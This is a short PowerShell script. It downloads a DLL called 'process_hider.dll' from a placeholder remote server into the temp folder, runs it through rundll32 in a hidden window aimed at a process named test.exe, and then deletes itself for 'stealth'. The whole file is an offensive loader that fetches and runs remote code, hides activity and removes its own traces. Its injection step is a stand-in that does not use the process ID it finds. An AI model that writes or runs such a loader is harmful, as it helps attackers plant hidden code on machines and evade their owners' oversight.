# Set variables
$DLL_URL = "http://yourserver.com/process_hider.dll"  # Change this to your actual DLL URL
$DLL_PATH = "$env:TEMP\process_hider.dll"
$PROCESS_NAME = "test.exe"

# Download the DLL
Invoke-WebRequest -Uri $DLL_URL -OutFile $DLL_PATH

# Find test.exe's PID
$Process = Get-Process -Name $PROCESS_NAME -ErrorAction SilentlyContinue
if ($Process) {
    $PID = $Process.Id
    Write-Host "Injecting DLL into $PROCESS_NAME (PID: $PID)"

    # Inject DLL using rundll32 (Replace with your actual injection method)
    $InjectDLL = "C:\Windows\System32\rundll32.exe $DLL_PATH,Inject"
    Start-Process -FilePath "C:\Windows\System32\rundll32.exe" -ArgumentList "$DLL_PATH,Inject" -WindowStyle Hidden
} else {
    Write-Host "$PROCESS_NAME not found!"
}

# Optional: Remove script after execution (Stealth)
Remove-Item -Path $PSCommandPath -Force
